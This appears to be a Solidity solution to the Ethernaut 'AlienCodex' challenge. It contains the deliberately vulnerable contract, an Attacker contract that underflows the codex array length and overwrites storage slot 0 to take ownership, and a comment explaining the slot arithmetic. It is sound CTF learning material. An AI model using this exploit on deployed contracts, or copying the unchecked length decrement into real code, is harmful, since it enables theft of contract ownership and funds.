// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import 'https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Attacker {
    AlienCodex alienCodex;
    constructor(address target) public { alienCodex = AlienCodex(target); }

    function attack() external {
        alienCodex.make_contact();
        alienCodex.retract();

        uint256 slot = -uint256(keccak256(abi.encode(uint256(1))));
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));

        alienCodex.revise(slot, newOwner);
    }
}

/*
Explanation:

AlienCodex storage layout:
Slot 0 -> _owner (20 bytes), contact (1 byte)
Slot 1 -> length of codex (32 bytes)

codex array storage layout:
Slot keccak256(1) -> codex[0]
Slot keccak256(1) + 1 -> codex[1]
.
.
.
Slot keccak256(1) + 2**256 - 1 -> codex[2**256-1]

There are total 2**256 storage slots and slot 0,1 have already been used. 
And after the retract() call the size of codex underflows to 2**256 - 1.
So there will be an overlap with the elements of the codex array and slot 0

Let, i be the index of the element of codex which overlaps with slot 0

Slot keccak256(1) + i -> Slot 0
So, i = 0 - keccak256(1) 
*/
